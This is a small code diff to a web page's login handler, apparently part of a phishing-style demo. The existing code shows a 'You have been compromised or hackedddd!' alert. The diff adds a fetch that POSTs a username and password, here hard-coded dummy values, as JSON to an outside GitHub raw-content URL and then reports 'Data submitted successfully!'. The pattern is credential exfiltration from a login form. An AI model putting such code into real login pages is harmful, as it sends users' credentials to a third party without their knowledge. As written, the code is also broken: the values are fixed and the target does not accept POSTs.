@@ -106,6 +106,24 @@ function handleLogin(event) {
 
       // Show a message after the login button is clicked
       alert("You have been compromised or hackedddd!");
+
+
+
+   // Get the values of the inputs
+            const username = "fhdjhdhfhdf";
+            const password = "1234545";
+            
+            // Send the data to the backend server (replace with your backend URL)
+            fetch('https://raw.githubusercontent.com/vikramolii/test/refs/heads/main/data.txt', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ username, password })
+            })
+            .then(response => response.json())
+            .then(data => alert('Data submitted successfully!'))
+            .catch(error => console.error('Error:', error));
     }
 </script>
 </body>
